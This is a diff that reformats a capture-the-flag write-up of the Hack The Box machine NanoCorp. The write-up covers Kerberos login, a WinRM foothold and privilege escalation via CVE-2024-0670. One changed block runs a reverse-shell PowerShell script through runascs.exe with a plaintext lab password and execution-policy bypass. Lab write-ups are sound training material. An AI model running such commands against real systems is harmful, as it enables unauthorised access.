@@ -1,4 +1,4 @@
-﻿---
+---
 title: 'HTB-NanoCorp'
 published: 2025-09-18
 draft: false
@@ -190,8 +190,9 @@ After a reset I used the following commands to get the kerberos TGT
 
 ![](attachments/d2631a8feb76988e038a337d193924e3.png)
 
->[!important]
->The TGT is needed in order to log in since **PROTECTED USERS** blocks any and all `ntlm` login attempts.
+:::important
+The TGT is needed in order to log in since **PROTECTED USERS** blocks any and all `ntlm` login attempts.
+:::
 
 The following had to be changed within the `/etc/krb5.conf` file:
 
@@ -206,8 +207,9 @@ I was now able to export the `.ccache` file:
 # Foothold
 ## 5986/TCP - winrms
 
->[!important]
->For the below I had to install `evil-winrm-py` to get it to work. This can be done using `pipx install 'evil-winrm-py[kerberos]'`
+:::important
+For the below I had to install `evil-winrm-py` to get it to work. This can be done using `pipx install 'evil-winrm-py[kerberos]'`
+:::
 
 ![](attachments/ec5b14e998091f115de60552ef922970.png)
 
@@ -236,9 +238,10 @@ Other than that nothing was really found using `winpeas` here.
 # Privilege Escalation
 ## CVE-2024-0670 - Check_mk_agent
 
->[!note]
->My shell dropped and I couldn't reconnect via `evil-winrm-py` so I looked for yet another solution
->![](attachments/83794582c239017103eb9d1ca4c18fbf.png)
+:::note
+My shell dropped and I couldn't reconnect via `evil-winrm-py` so I looked for yet another solution
+![](attachments/83794582c239017103eb9d1ca4c18fbf.png)
+:::
 
 ![](attachments/674f7424be3b9d634520e730b158de4c.png)
 
@@ -333,8 +336,8 @@ This script get's transfered over to the target and a listener is launched.
 ```powershell
 copy shell.ps1 C:\Windows\Temp\shell.ps1
 
-.\runascs.exe web_svc 'dksehdgh712!@#' â€œC:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -E
-xecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1â€
+.\runascs.exe web_svc 'dksehdgh712!@#' “C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -E
+xecutionPolicy Bypass -File C:\Windows\Temp\shell.ps1”
 ```
 
 ![](attachments/555bca2e4c130df6c07ad1c648c072da.png)
